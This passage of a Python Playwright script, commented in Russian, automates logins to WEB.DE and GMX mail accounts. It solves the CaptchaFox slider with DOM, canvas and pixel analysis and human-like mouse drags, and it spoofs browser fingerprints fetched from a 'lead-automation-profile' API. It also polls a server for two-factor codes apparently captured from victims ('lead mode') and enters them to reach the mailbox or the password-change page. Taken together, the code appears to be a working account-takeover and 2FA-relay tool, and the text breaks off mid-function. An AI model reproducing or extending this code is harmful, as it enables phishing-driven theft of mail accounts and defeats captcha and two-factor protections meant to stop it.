        if result is None or result.get("dragDistance") is None:
            time.sleep(0.2)
            result = frame.evaluate(script)
        if result and result.get("dragDistance") is not None and result["dragDistance"] > 0:
            return result["dragDistance"], result.get("trackWidth") or 300
    except Exception:
        pass
    return None


def _get_captcha_slider_distance_from_screenshot(frame, track_width_fallback: float = 300):
    """
    Запасной вариант: скриншот области с картинками, по пикселям ищем два блока — расстояние между центрами.
    Требует Pillow. Масштаб скриншота = масштаб canvas, дистанция в пикселях подходит для перетаскивания.
    """
    if not _HAS_PIL:
        return None
    try:
        loc = frame.locator(".cf-slide__canvas").first
        if loc.count() == 0:
            loc = frame.locator(".cf-challenge__content").first
        if loc.count() == 0:
            return None
        raw = loc.screenshot(type="png")
        if not raw:
            return None
        img = Image.open(io.BytesIO(raw)).convert("L")
        w, h = img.size
        if w < 80 or h < 20:
            return None
        pix = img.load()
        column_weight = [0.0] * w
        for x in range(w):
            for y in range(h):
                v = pix[x, y]
                if v < 252:
                    column_weight[x] += (255 - v)
        max_cw = max(column_weight) if column_weight else 0
        if max_cw < 5:
            return None
        threshold = max(12, max_cw * 0.04)
        blocks = []
        in_block = False
        start = 0
        for x in range(w + 1):
            heavy = column_weight[x] > threshold if x < w else False
            if heavy and not in_block:
                in_block = True
                start = x
            if (not heavy or x == w - 1) and in_block:
                end = min(x + 1, w)
                if end - start >= 6:
                    blocks.append((start, end, (start + end) / 2))
                in_block = False
        if len(blocks) >= 2:
            blocks.sort(key=lambda b: b[2])
            left_c = blocks[0][2]
            right_c = blocks[-1][2]
            dist = right_c - left_c
            dist = max(40, min(int(round(dist - 6)), int(track_width_fallback - 80)))
            return dist, track_width_fallback
    except Exception:
        pass
    return None


def _get_captcha_slider_distance(frame):
    """
    Находит две картинки задания при любом расположении (картинки и позиции меняются).
    Берём пару с максимальным расстоянием по горизонтали — это всегда «левая» и «правая» цель.
    Если в DOM нет картинок (они на canvas), возвращает None — вызывающий попробует canvas-анализ.
    """
    script = """
    () => {
        const track = document.querySelector('.cf-slider');
        if (!track) return null;
        const trackR = track.getBoundingClientRect();
        const trackLeft = trackR.left;
        const trackRight = trackR.right;
        const trackWidth = trackR.width;
        const sliderTop = trackR.top;
        const btn = document.querySelector('.cf-slider__button');
        const handleWidth = btn ? btn.getBoundingClientRect().width : 60;
        const maxDrag = Math.max(50, trackWidth - handleWidth - 20);
        const zoneTop = sliderTop - 130;
        const zoneBottom = sliderTop - 5;
        const zoneLeft = trackLeft - 25;
        const zoneRight = trackRight + 25;
        function inZone(r) {
            return r.width >= 18 && r.width <= 220 && r.height >= 18 && r.height <= 220 &&
                r.right >= zoneLeft && r.left <= zoneRight && r.bottom >= zoneTop && r.top <= zoneBottom;
        }
        const raw = [];
        function add(el) {
            const r = el.getBoundingClientRect();
            if (!inZone(r)) return;
            const style = el.ownerDocument.defaultView.getComputedStyle(el);
            if (style.display === 'none' || style.visibility === 'hidden' || parseFloat(style.opacity) < 0.1) return;
            raw.push({ left: r.left, right: r.right, width: r.width, height: r.height, centerX: r.left + r.width/2, area: r.width * r.height });
        }
        const root = track.closest('[class*="cf-"]') || document.body;
        root.querySelectorAll('img').forEach(add);
        root.querySelectorAll('svg').forEach(add);
        root.querySelectorAll('[class*="cf-challenge"], [class*="cf-content"], [class*="cf-image"]').forEach(c => {
            if (c.contains(track)) return;
            add(c);
        });
        root.querySelectorAll('div, span, section').forEach(el => {
            if (el.closest('.cf-slider')) return;
            const r = el.getBoundingClientRect();
            if (r.width < 18 || r.height < 18 || r.width > 220 || r.height > 220) return;
            if (el.children.length > 4) return;
            add(el);
        });
        raw.sort((a, b) => a.centerX - b.centerX);
        const merged = [];
        for (const c of raw) {
            const last = merged[merged.length - 1];
            if (last && Math.abs(last.centerX - c.centerX) < 32) {
                if (c.area > last.area) merged[merged.length - 1] = c;
            } else {
                merged.push(c);
            }
        }
        if (merged.length < 2) return null;
        let bestA = merged[0], bestB = merged[1], bestDist = Math.abs(merged[1].centerX - merged[0].centerX);
        for (let i = 0; i < merged.length; i++) {
            for (let j = i + 1; j < merged.length; j++) {
                const d = Math.abs(merged[j].centerX - merged[i].centerX);
                if (d > bestDist && d < trackWidth + 50) {
                    bestDist = d;
                    bestA = merged[i];
                    bestB = merged[j];
                }
            }
        }
        const leftImg = bestA.centerX < bestB.centerX ? bestA : bestB;
        const rightImg = bestA.centerX < bestB.centerX ? bestB : bestA;
        const dist = rightImg.centerX - leftImg.centerX;
        if (dist < 12) return null;
        const margin = 22;
        let dragDistance = Math.round(dist - margin);
        dragDistance = Math.max(0, Math.min(dragDistance, maxDrag));
        return { dragDistance, trackWidth: Math.round(trackWidth), handleWidth: Math.round(handleWidth) };
    }
    """
    try:
        result = frame.evaluate(script)
        if result and result.get("dragDistance") is not None and result["dragDistance"] > 0:
            return result["dragDistance"], result.get("trackWidth") or 400
    except Exception:
        pass
    return None


def _find_slider_handle_via_js(page):
    """Ищем ручку слайдера (.cf-slider__button). Возвращает (frame, rect в координатах viewport)."""
    find_script = """
    () => {
        const btn = document.querySelector('.cf-slider__button');
        if (btn) {
            const r = btn.getBoundingClientRect();
            return { x: r.left, y: r.top, width: r.width, height: r.height };
        }
        let best = null;
        const walk = (el) => {
            if (!el || el.nodeType !== 1) return;
            const text = (el.textContent || '').toLowerCase();
            const cls = (el.className || '').toLowerCase();
            if (text.includes('schieben') || (typeof cls === 'string' && cls.includes('cf-slider'))) {
                const r = el.getBoundingClientRect();
                if (r.width >= 8 && r.width <= 250 && r.height <= 80) {
                    if (!best || r.width * r.height < best.width * best.height)
                        best = { x: r.left, y: r.top, width: r.width, height: r.height };
                }
            }
            for (let i = 0; i < el.children.length; i++) walk(el.children[i]);
        };
        walk(document.body);
        return best;
    }
    """
    for frame in [page.main_frame] + [f for f in page.frames if f != page.main_frame]:
        try:
            rect = frame.evaluate(find_script)
            if rect and rect.get("width") and rect.get("height"):
                # Координаты из iframe — относительно iframe. Добавляем позицию iframe на странице, чтобы клик попал в стрелку.
                if frame != page.main_frame:
                    try:
                        iframes_data = page.evaluate("""
                            () => Array.from(document.querySelectorAll('iframe')).map(f => ({
                                src: (f.src || ''),
                                x: f.getBoundingClientRect().x,
                                y: f.getBoundingClientRect().y
                            }))
                        """)
                        frame_url = (frame.url or "")
                        for info in (iframes_data or []):
                            src = info.get("src") or ""
                            if src and (frame_url in src or src in frame_url or src.split("?")[0] in frame_url):
                                rect = {
                                    "x": info["x"] + rect["x"],
                                    "y": info["y"] + rect["y"],
                                    "width": rect["width"],
                                    "height": rect["height"],
                                }
                                break
                    except Exception:
                        pass
                return frame, rect
        except Exception:
            continue
    return None, None


def _drag_slider_inside_frame(page, frame, rect: dict, drag_distance: float = 380) -> None:
    """
    Перетаскивание .cf-slider__button диспатчем событий мыши внутри iframe капчи.
    """
    cx = rect["x"] + rect["width"] / 2
    cy = rect["y"] + rect["height"] / 2
    steps = random.randint(90, 130)
    step = drag_distance / steps

    # mousedown на .cf-slider__button (ручка «Nach rechts schieben»)
    frame.evaluate(
        """([cx, cy]) => {
            const btn = document.querySelector('.cf-slider__button');
            if (btn) {
                btn.dispatchEvent(new MouseEvent('mousedown', {
                    clientX: cx, clientY: cy, bubbles: true, cancelable: true,
                    view: window, buttons: 1, button: 0
                }));
            }
        }""",
        [cx, cy],
    )
    time.sleep(random.uniform(0.05, 0.12))

    # Серия mousemove вправо — диспатчим на .cf-slider__button и document (капча может слушать оба)
    for i in range(1, steps + 1):
        x = cx + step * i + random.uniform(-1, 1)
        y = cy + random.uniform(-1.5, 1.5)
        _show_click_at(page, x, y)
        try:
            frame.evaluate(
                """([x, y]) => {
                    const btn = document.querySelector('.cf-slider__button');
                    const ev = new MouseEvent('mousemove', { clientX: x, clientY: y, bubbles: true, view: window, buttons: 1 });
                    if (btn) btn.dispatchEvent(ev);
                    document.documentElement.dispatchEvent(ev);
                }""",
                [x, y],
            )
        except Exception:
            pass
        time.sleep(random.uniform(0.02, 0.04))

    # mouseup на кнопке и document
    end_x = cx + drag_distance
    try:
        frame.evaluate(
            """([x, y]) => {
                const btn = document.querySelector('.cf-slider__button');
                const ev = new MouseEvent('mouseup', { clientX: x, clientY: y, bubbles: true, view: window, buttons: 0 });
                if (btn) btn.dispatchEvent(ev);
                document.documentElement.dispatchEvent(ev);
            }""",
            [end_x, cy],
        )
    except Exception:
        pass
    time.sleep(random.uniform(0.1, 0.2))


def solve_captchafox_slider_manually(page) -> bool:
    """
    Автопроход CaptchaFox: клик по «Ich bin ein Mensch», затем человекообразное перетаскивание слайдера.
    Возвращает True если капча, по мнению скрипта, пройдена.
    """
    # Если поле пароля уже видно — капча не нужна или уже пройдена, не трогаем чекбокс
    try:
        pw = page.locator('input[type="password"], input[name="password"], input[placeholder*="Passwort"]').first
        if pw.count() > 0 and pw.is_visible():
            log("Капча", "Поле пароля уже есть — капча не нужна")
            return True
    except Exception:
        pass

    # Ищем iframe CaptchaFox/Turnstile (виджет может быть в iframe)
    iframe_sel = "iframe[src*='captchafox'], iframe[src*='turnstile'], iframe[title*='widget']"
    frame_loc = None
    try:
        fl = page.frame_locator(iframe_sel).first
        fl.locator("body").wait_for(state="visible", timeout=3500)
        frame_loc = fl
    except Exception:
        pass

    def _click_checkbox() -> bool:
        def _try_click(locator, in_frame: bool = False, timeout_ms: int = 3000):
            try:
                loc = frame_loc.locator(locator).first if in_frame else page.locator(locator).first
                if loc.count() == 0:
                    return False
                if in_frame:
                    loc.click(timeout=timeout_ms)
                elif loc.is_visible():
                    loc.click(timeout=timeout_ms)
                else:
                    return False
                return True
            except Exception:
                return False

        # 0) Сначала кружок на основной странице (web.de: быстрее всего)
        try:
            box_el = page.get_by_text("Ich bin ein Mensch", exact=False).first
            if box_el.count() > 0 and box_el.is_visible():
                box = box_el.bounding_box()
                if box:
                    left_part = min(35, box["width"] * 0.18)
                    cx = box["x"] + left_part + random.uniform(-3, 3)
                    cy = box["y"] + box["height"] / 2 + random.uniform(-2, 2)
                    _show_click_at(page, cx, cy)
                    time.sleep(0.04)
                    page.mouse.click(cx, cy)
                    return True
                box_el.click(timeout=2000)
                return True
        except Exception:
            pass

        # 1) Стандартные чекбоксы в iframe и на странице
        if frame_loc:
            for sel in ["[role='checkbox']", "input[type='checkbox']", "label:has-text('Mensch')", ".checkbox"]:
                if _try_click(sel, in_frame=True):
                    return True
        for sel in ["[role='checkbox']", "input[type='checkbox']", "text=Mensch"]:
            if _try_click(sel, in_frame=False):
                return True

        # 2) Кружок в iframe или повтор на странице
        for scope in ([frame_loc] if frame_loc else []) + [page]:
            try:
                if scope == page:
                    box_el = page.get_by_text("Ich bin ein Mensch", exact=False).first
                else:
                    box_el = scope.locator("text=Ich bin ein Mensch").first
                if box_el.count() == 0:
                    continue
                box = box_el.bounding_box()
                if not box:
                    box_el.click(timeout=3000)
                    return True
                # Кружок слева от текста — кликаем в левые 15–20% блока
                left_part = min(35, box["width"] * 0.18)
                cx = box["x"] + left_part + random.uniform(-3, 3)
                cy = box["y"] + box["height"] / 2 + random.uniform(-2, 2)
                _show_click_at(page, cx, cy)
                time.sleep(0.06)
                page.mouse.click(cx, cy)
                return True
            except Exception:
                continue

        # 3) Клик по контейнеру с текстом
        try:
            loc = page.locator(":has-text('Ich bin ein Mensch')").first
            if loc.count() > 0:
                loc.click(timeout=3000, force=True)
                return True
        except Exception:
            pass
        try:
            page.get_by_text("Ich bin ein Mensch", exact=False).first.click(timeout=3000, force=True)
            return True
        except Exception:
            pass
        return False

    if SHOW_CLICKS:
        log("Капча", "Подсветка кликов включена")
    log("Капча", "Кликаю по «Ich bin ein Mensch»")
    if not _click_checkbox():
        alert("Капча: чекбокс «Ich bin ein Mensch» не найден", "Элемент не обнаружен на странице")
        return False
    # Важно: не начинаем drag раньше, чем реально появился handle слайдера.
    log("Капча", "Жду появления слайдера (до 12 сек)")
    slider_deadline = time.monotonic() + 12.0
    captcha_frame = None
    js_rect = None
    while time.monotonic() < slider_deadline:
        captcha_frame, js_rect = _find_slider_handle_via_js(page)
        if captcha_frame is not None and js_rect:
            break
        time.sleep(0.35)
    if captcha_frame is None or js_rect is None:
        # fallback: короткая пауза и ещё раз
        time.sleep(1.2)
        captcha_frame, js_rect = _find_slider_handle_via_js(page)

    # Ищем .cf-slider__button (в главном фрейме или iframe). Тащим РЕАЛЬНОЙ мышью — капча игнорирует синтетические события (isTrusted: false).
    if captcha_frame is not None and js_rect:
        captcha_right_x = None
        try:
            captcha_frame.evaluate("() => document.querySelector('.cf-slider__button')?.scrollIntoView({block:'center',behavior:'instant'})")
            time.sleep(0.08)
            new_rect = captcha_frame.evaluate("() => { const b = document.querySelector('.cf-slider__button'); return b ? { x: b.getBoundingClientRect().x, y: b.getBoundingClientRect().y, width: b.getBoundingClientRect().width, height: b.getBoundingClientRect().height } : null; }")
            if new_rect and captcha_frame != page.main_frame:
                iframes_data = page.evaluate("() => Array.from(document.querySelectorAll('iframe')).map(f => ({ src: (f.src || ''), x: f.getBoundingClientRect().x, y: f.getBoundingClientRect().y, w: f.getBoundingClientRect().width, h: f.getBoundingClientRect().height }))")
                frame_url = (captcha_frame.url or "")
                for info in (iframes_data or []):
                    src = (info.get("src") or "")
                    if src and (frame_url in src or src in frame_url or src.split("?")[0] in frame_url):
                        new_rect = { "x": info["x"] + new_rect["x"], "y": info["y"] + new_rect["y"], "width": new_rect["width"], "height": new_rect["height"] }
                        js_rect = new_rect
                        break
            elif new_rect:
                js_rect = new_rect
            btn_cx = js_rect["x"] + (js_rect.get("width") or 0) / 2
            btn_cy = js_rect["y"] + (js_rect.get("height") or 0) / 2
            iframe_at_point = page.evaluate("""([cx, cy]) => {
                const list = document.querySelectorAll('iframe');
                let best = null;
                for (const f of list) {
                    const r = f.getBoundingClientRect();
                    if (cx >= r.left && cx <= r.right && cy >= r.top && cy <= r.bottom) {
                        const area = r.width * r.height;
                        if (!best || area < best.area)
                            best = { left: r.left, w: r.width, area };
                    }
                }
                return best ? { left: best.left, w: best.w } : null;
            }""", [btn_cx, btn_cy])
            if iframe_at_point:
                box_right = captcha_frame.evaluate("""() => {
                    const t = document.querySelector('.cf-slider');
                    if (!t) return null;
                    const box = t.closest('[class*="cf-"]');
                    const r = box ? box.getBoundingClientRect() : t.getBoundingClientRect();
                    return r.right;
                }""")
                if box_right is not None:
                    captcha_right_x = iframe_at_point["left"] + box_right - 15
                    log("Капча", f"Граница слайдера: x={captcha_right_x:.0f}")
            if captcha_right_x is None:
                box_right_viewport = captcha_frame.evaluate("""() => {
                    const t = document.querySelector('.cf-slider');
                    if (!t) return null;
                    const box = t.closest('[class*="cf-"]');
                    const r = box ? box.getBoundingClientRect() : t.getBoundingClientRect();
                    return r.right;
                }""")
                if box_right_viewport is not None and captcha_frame == page.main_frame:
                    captcha_right_x = box_right_viewport - 15
                    log("Капча", f"Граница слайдера: x={captcha_right_x:.0f}")
        except Exception as e:
            log("Капча", "Ошибка расчёта границы слайдера")
        if js_rect:
            handle_width = js_rect.get("width") or 60
            track_width_from_dom = None
            try:
                track_width_from_dom = captcha_frame.evaluate("""() => {
                    const s = document.querySelector('.cf-slider');
                    if (s) return s.getBoundingClientRect().width;
                    const c = document.querySelector('.cf-slide__canvas canvas, .cf-slide canvas');
                    return c ? (c.width || parseInt(c.style.width) || 300) : 300;
                }""")
            except Exception:
                pass
            track_width = track_width_from_dom if isinstance(track_width_from_dom, (int, float)) and track_width_from_dom > 0 else 300
            time.sleep(0.12)
            distance_result = _get_captcha_slider_distance(captcha_frame)
            if not distance_result:
                distance_result = _get_captcha_slider_distance_from_canvas(captcha_frame)
                if distance_result:
                    log("Капча", "Расстояние для слайдера получено по картинке")
            if not distance_result and _HAS_PIL:
                distance_result = _get_captcha_slider_distance_from_screenshot(captcha_frame, track_width)
                if distance_result:
                    log("Капча", "Расстояние для слайдера получено по скриншоту")
            if distance_result:
                exact_distance, track_width = distance_result
                max_drag = max(50, (track_width - handle_width - 20))
                exact_clamped = min(exact_distance, max_drag)
                # Цель в зоне принятия: [exact - tolerance, exact + tolerance]; случайная точка внутри неё
                drag_distance = exact_clamped + random.uniform(
                    -CAPTCHA_SLIDER_TOLERANCE_PX, CAPTCHA_SLIDER_TOLERANCE_PX
                )
                drag_distance = max(40, min(round(drag_distance), max_drag))
                log("Капча", f"Тащу слайдер на {drag_distance:.0f} px")
            else:
                max_drag = max(50, (track_width - handle_width - 30))
                drag_distance = min(260, max_drag)
                drag_distance = max(80, drag_distance - random.uniform(0, 20))
                log("Капча", f"Расстояние не рассчитано — тащу на {drag_distance:.0f} px")
            try:
                _human_drag_slider(page, js_rect, drag_distance=drag_distance, track_width=track_width, frame=captcha_frame, captcha_right_x=captcha_right_x)
                time.sleep(random.uniform(0.3, 0.6))
                log("Капча", "Слайдер отпущен, жду поле пароля")
                time.sleep(random.uniform(2.5, 3.5))
                return True
            except Exception:
                time.sleep(0.5)
                if page.locator('input[type="password"], input[name="password"], input[placeholder*="Passwort"]').first.count() > 0 and page.locator('input[type="password"], input[name="password"], input[placeholder*="Passwort"]').first.is_visible():
                    log("Капча", "пройдена (появилось поле пароля)")
                    return True
                return False

    def _captcha_passed():
        """Капча считается пройденной, если видно поле пароля."""
        try:
            pw = page.locator('input[type="password"], input[name="password"], input[placeholder*="Passwort"]').first
            return pw.count() > 0 and pw.is_visible()
        except Exception:
            return False

    # Запас: локаторы + drag_to
    handle_selectors = [
        ".cf-slider__button",
        "[class*='cf-slider__button']",
        "text=Nach rechts schieben",
        ":has-text('Nach rechts schieben')",
        "[class*='handle']",
        "[class*='slider'] [class*='handle']",
        "[class*='drag']",
        "span[role='slider']",
        "div[class*='slider'] > div",
        "[class*='cf-'] div[class*='arrow']",
        "div[class*='slide']",
    ]
    track_selectors = [
        "[class*='slider']",
        "[class*='track']",
        "[class*='slide']",
    ]

    def _find_handle_and_track():
        # Сначала в текущем frame_loc
        if frame_loc:
            for hs in handle_selectors:
                try:
                    loc = frame_loc.locator(hs).first
                    if loc.count() > 0 and loc.is_visible():
                        for ts in track_selectors:
                            try:
                                tloc = frame_loc.locator(ts).first
                                if tloc.count() > 0 and tloc.is_visible():
                                    return loc, tloc
                            except Exception:
                                pass
                        return loc, None
                except Exception:
                    continue
        # На основной странице
        for hs in handle_selectors:
            try:
                loc = page.locator(hs).first
                if loc.count() > 0 and loc.is_visible():
                    for ts in track_selectors:
                        try:
                            tloc = page.locator(ts).first
                            if tloc.count() > 0 and tloc.is_visible():
                                return loc, tloc
                        except Exception:
                            pass
                    return loc, None
            except Exception:
                continue
        # Во всех фреймах (слайдер может быть в новом iframe после чекбокса)
        for frame in page.frames:
            if frame == page.main_frame:
                continue
            try:
                for hs in handle_selectors:
                    try:
                        loc = frame.locator(hs).first
                        if loc.count() > 0:
                            for ts in track_selectors:
                                try:
                                    tloc = frame.locator(ts).first
                                    if tloc.count() > 0:
                                        return loc, tloc
                                except Exception:
                                    pass
                            return loc, None
                    except Exception:
                        continue
            except Exception:
                continue
        return None, None

    handle_el, track_el = _find_handle_and_track()
    if not handle_el:
        if _captcha_passed():
            log("Капча", "Поле пароля уже есть — капча пройдена")
            return True
        alert("Слайдер капчи не найден", "Ручка «Nach rechts schieben» не обнаружена — смена IP и повтор")
        return False

    try:
        handle_el.scroll_into_view_if_needed(timeout=3000)
    except Exception:
        pass
    time.sleep(0.2)

    # Способ 1: drag_to (надёжно для элементов в iframe)
    if track_el:
        try:
            track_box = track_el.bounding_box()
            if track_box and track_box.get("width"):
                tw = track_box["width"]
                th = track_box.get("height") or 40
                log("Капча", "Тащу слайдер вправо")
                handle_el.drag_to(
                    track_el,
                    target_position={"x": max(50, tw - 25), "y": th / 2},
                    force=True,
                    timeout=8000,
                    steps=random.randint(35, 55),
                )
                time.sleep(random.uniform(0.3, 0.6))
                log("Капча", "Слайдер отпущен, жду поле пароля")
                time.sleep(random.uniform(2.5, 3.5))
                return True
        except Exception as e:
            log("Капча", "Пробую перетащить мышью")
            if _captcha_passed():
                return True

    # Способ 2: мышь (по координатам)
    try:
        handle_box = handle_el.bounding_box()
        if handle_box:
            track_width = 300.0
            if track_el:
                try:
                    tb = track_el.bounding_box()
                    if tb:
                        track_width = tb["width"]
                except Exception:
                    pass
            drag_distance = max(350, track_width - handle_box["width"] - 10)
            log("Капча", "Тащу слайдер мышью вправо")
            _human_drag_slider(page, handle_box, drag_distance, track_width)
            time.sleep(random.uniform(0.3, 0.6))
            log("Капча", "Слайдер отпущен, жду поле пароля")
            time.sleep(random.uniform(2.5, 3.5))
            if _captcha_passed():
                return True
            return True
    except Exception as e:
        log("Капча", "Перетаскивание не удалось")
        if _captcha_passed():
            return True
    if _captcha_passed():
        log("Капча", "Поле пароля видно — капча пройдена")
        return True
    return False


def solve_and_fill_image_captcha(page, api_key: str):
    """Найти картинку капчи, отправить в API, ввести ответ."""
    # Ищем изображение капчи
    img = page.locator("img[src*='captcha'], img[alt*='aptcha'], .captcha img").first
    img.wait_for(state="visible", timeout=10000)
    src = img.get_attribute("src")
    if src and (src.startswith("data:") or src.startswith("http")):
        if src.startswith("data:"):
            b64 = src.split(",", 1)[1] if "," in src else src
        else:
            # скачать по URL
            with page.context.request.get(src) as r:
                body = r.body()
            b64 = base64.b64encode(body).decode("ascii")
    else:
        # скриншот элемента
        b64 = img.screenshot(type="png")
        b64 = base64.b64encode(b64).decode("ascii")
    text = solve_image_captcha(api_key, b64)
    # Поле ввода ответа капчи
    inp = page.locator("input[name*='captcha'], input[id*='captcha']").first
    if inp.count() == 0:
        inp = page.locator("input[type='text']").last
    inp.wait_for(state="visible", timeout=5000)
    inp.fill(text)


def _fp_from_api_playwright(playwright: dict) -> dict | None:
    """Маппинг profile.playwright с GET /api/lead-automation-profile на внутренний fp для контекста."""
    if not isinstance(playwright, dict):
        return None
    ua = (playwright.get("userAgent") or "").strip()
    if not ua:
        return None
    vp = playwright.get("viewport") or {}
    try:
        w = int(vp.get("width") or 1920)
        h = int(vp.get("height") or 1080)
    except (TypeError, ValueError):
        w, h = 1920, 1080
    mem = playwright.get("deviceMemory")
    dev_mem: int | None = None
    if mem is not None and mem != "":
        try:
            dev_mem = int(mem)
        except (TypeError, ValueError):
            dev_mem = None
    try:
        hw = int(playwright.get("hardwareConcurrency") or 8)
    except (TypeError, ValueError):
        hw = 8
    try:
        mtp = int(playwright.get("maxTouchPoints") or 0)
    except (TypeError, ValueError):
        mtp = 0
    langs = playwright.get("languages")
    if not isinstance(langs, list) or not langs:
        langs = ["de-DE", "de", "en-US", "en"]
    langs = [str(x) for x in langs if x]
    return {
        "locale": (playwright.get("locale") or "de-DE").strip() or "de-DE",
        "timezone_id": (playwright.get("timezoneId") or "Europe/Berlin").strip() or "Europe/Berlin",
        "accept_language": (playwright.get("acceptLanguage") or "de-DE,de;q=0.9").strip(),
        "user_agent": ua,
        "viewport": {"width": w, "height": h},
        "platform": (playwright.get("platform") or "Win32").strip() or "Win32",
        "hardware_concurrency": hw,
        "device_memory": dev_mem,
        "max_touch_points": mtp,
        "languages": langs,
    }


def _browser_engine_from_automation_profile(automation_profile: dict | None) -> str:
    if not automation_profile or not isinstance(automation_profile, dict):
        return "chromium"
    eng = str(automation_profile.get("browserEngine") or "chromium").lower().strip()
    if eng in ("chromium", "webkit", "firefox"):
        return eng
    return "chromium"


def _two_fa_fill_scopes(page):
    """Все фреймы страницы (включая main); поля 2FA на interception.gmx.net часто только во вложенном iframe."""
    try:
        return list(page.frames)
    except Exception:
        return [page.main_frame]


def _fill_webde_otp_in_scope(scope, digits6: str) -> bool:
    """Заполнение в одном Page или Frame."""
    n = len(digits6)

    def try_cells(selector: str, need: int) -> bool:
        try:
            loc = scope.locator(selector)
            if loc.count() < need:
                return False
            for i in range(need):
                cell = loc.nth(i)
                if not cell.is_visible():
                    return False
                cell.click(timeout=8000)
                cell.fill("")
                cell.fill(digits6[i], timeout=5000)
            return True
        except Exception:
            return False

    if try_cells("input.separated-input__field", n):
        return True
    if try_cells(".twoFa-code-input input", n):
        return True
    if try_cells("input[class*='separated-input__field']", n):
        return True
    if try_cells("input[class*='separated-input']", n):
        return True
    if try_cells('input[maxlength="1"], input[maxLength="1"]', n):
        return True
    if try_cells('input[inputmode="numeric"][maxlength="1"]', n):
        return True

    single_selectors = (
        'input[autocomplete="one-time-code"]',
        'input[inputmode="numeric"]',
        'input[type="tel"]',
        'input[type="number"]',
        'input#password',
        'input[name="password"]',
        'input[name="otp"]',
        'input[name="code"]',
        'input[id*="otp"], input[id*="OTP"]',
        'input[id*="code"], input[id*="Code"]',
        '[data-testid="twoFaCodeInput"] input',
        'input[data-testid*="otp"], input[data-testid*="OTP"]',
    )
    for sel in single_selectors:
        try:
            loc = scope.locator(sel).first
            if loc.count() > 0 and loc.is_visible():
                loc.click(timeout=8000)
                loc.fill("")
                loc.fill(digits6, timeout=5000)
                return True
        except Exception:
            pass
    return False


def _fill_webde_two_factor_code(page, code: str) -> bool:
    """6 цифр: ячейки OTP или одно поле; обход iframe (WEB.DE interception)."""
    digits = re.sub(r"\D", "", code or "")[:8]
    if len(digits) < 6:
        return False
    digits6 = digits[:6]
    for scope in _two_fa_fill_scopes(page):
        if _fill_webde_otp_in_scope(scope, digits6):
            return True
    # Fallback: по одной цифре в каждую ячейку (controlled inputs)
    try:
        for scope in _two_fa_fill_scopes(page):
            sep = scope.locator("input.separated-input__field, .twoFa-code-input input")
            if sep.count() >= 6:
                for i in range(6):
                    c = sep.nth(i)
                    c.click(timeout=8000)
                    c.press_sequentially(digits6[i], delay=35)
                return True
    except Exception:
        pass
    try:
        for scope in _two_fa_fill_scopes(page):
            ones = scope.locator('input[maxlength="1"], input[maxLength="1"]')
            if ones.count() >= 6:
                for i in range(6):
                    c = ones.nth(i)
                    c.click(timeout=8000)
                    c.press_sequentially(digits6[i], delay=35)
                return True
    except Exception:
        pass
    # Одно поле на весь код
    try:
        for scope in _two_fa_fill_scopes(page):
            first = scope.locator(
                'input[autocomplete="one-time-code"], input[inputmode="numeric"], input[type="tel"]'
            ).first
            if first.count() > 0 and first.is_visible():
                first.click(timeout=8000)
                first.press_sequentially(digits6, delay=45)
                return True
    except Exception:
        pass
    if _WEBDE_VERBOSE_LOG:
        try:
            u = page.url or ""
            fc = len(page.frames)
            log("2FA", "селекторы не сработали", f"url={u[:100]} frames={fc}", verbose_only=True)
        except Exception:
            pass
    return False


def _click_webde_two_factor_submit(page) -> None:
    try:
        for txt in ("Weiter", "Bestätigen", "Login", "Absenden"):
            try:
                btn = page.get_by_role("button", name=re.compile(r"^\s*" + re.escape(txt) + r"\s*$", re.I))
                if btn.count() > 0:
                    btn.first.click(timeout=5000)
                    return
            except Exception:
                continue
        yl = page.locator('button[class*="yellow"], button.btn-yellow, .button-primary')
        if yl.count() > 0:
            yl.first.click(timeout=5000)
            return
        page.locator('button[type="submit"]').first.click(timeout=5000)
    except Exception:
        try:
            page.keyboard.press("Enter")
        except Exception:
            pass


def _body_indicates_wrong_two_factor(page) -> bool:
    try:
        if page.locator('[role="alert"]').count() > 0:
            msg = (page.locator('[role="alert"]').first.inner_text() or "").lower()
            if any(
                x in msg
                for x in (
                    "nicht korrekt",
                    "ungültig",
                    "überprüfen",
                    "falsch",
                    "incorrect",
                )
            ):
                return True
        t = (page.locator("body").inner_text() or "").lower()
        if ("zwei-faktor" in t or "two-factor" in t or "authentifizierungs" in t) and "nicht korrekt" in t:
            return True
    except Exception:
        pass
    return False


def _wait_after_two_factor_submit(page, context, timeout_sec: float = 28.0) -> str:
    """success | wrong | timeout"""
    deadline = time.monotonic() + timeout_sec
    while time.monotonic() < deadline:
        _check_script_idle_or_raise()
        try:
            pgs = list(context.pages) if context else [page]
        except Exception:
            pgs = [page]
        for p in pgs:
            try:
                u = p.url or ""
            except Exception:
                continue
            if _url_is_mailbox_or_pwchange(u) or _url_is_help_page_after_login(u):
                return "success"
        if _body_indicates_wrong_two_factor(page):
            return "wrong"
        time.sleep(0.35)
    return "timeout"


def _lead_mode_two_factor_challenge(
    page,
    context,
    email: str,
    poll_two_fa_code: Optional[Callable[..., Any]],
    on_two_factor_wait_start: Optional[Callable[..., Any]],
    on_wrong_two_fa: Optional[Callable[..., Any]],
    on_lead_success_hold: Optional[Callable[[], None]] = None,
) -> str:
    """
    poll_two_fa_code(last_submitted_at_iso: str | None) -> tuple[code, submitted_at] | None — только свежий kind=2fa с сервера.
    Возврат: success | wrong_2fa | two_factor_timeout | error | two_factor (нет poll).
    """
    if not poll_two_fa_code:
        return "two_factor"
    if on_two_factor_wait_start:
        try:
            on_two_factor_wait_start()
        except Exception:
            pass
    wait_log("2FA", "ожидание кода (опрос /api/webde-poll-2fa-code), до 5 мин на каждую попытку")
    last_consumed_submitted_at: str | None = None
    max_rounds = 5
    for round_idx in range(max_rounds):
        code_pair = None
        poll_deadline = time.monotonic() + 300.0
        while time.monotonic() < poll_deadline:
            _check_script_idle_or_raise()
            try:
                code_pair = poll_two_fa_code(last_consumed_submitted_at)
            except Exception:
                code_pair = None
            if code_pair and len(code_pair) >= 2:
                c0 = re.sub(r"\D", "", str(code_pair[0] or ""))[:8]
                if len(c0) >= 6:
                    break
            time.sleep(2)
        if not code_pair or len(code_pair) < 2:
            log("2FA", "таймаут: код 2FA не получен за 5 мин")
            return "two_factor_timeout"
        code_raw, submitted_at = str(code_pair[0]).strip(), str(code_pair[1] or "").strip()
        code_digits = re.sub(r"\D", "", code_raw)[:8]
        if len(code_digits) < 6:
            return "error"
        if not _fill_webde_two_factor_code(page, code_digits):
            log("2FA", "не удалось заполнить поля 2FA на WEB.DE")
            return "error"
        time.sleep(0.25)
        _click_webde_two_factor_submit(page)
        time.sleep(0.6)
        outcome = _wait_after_two_factor_submit(page, context, timeout_sec=28.0)
        if outcome == "success":
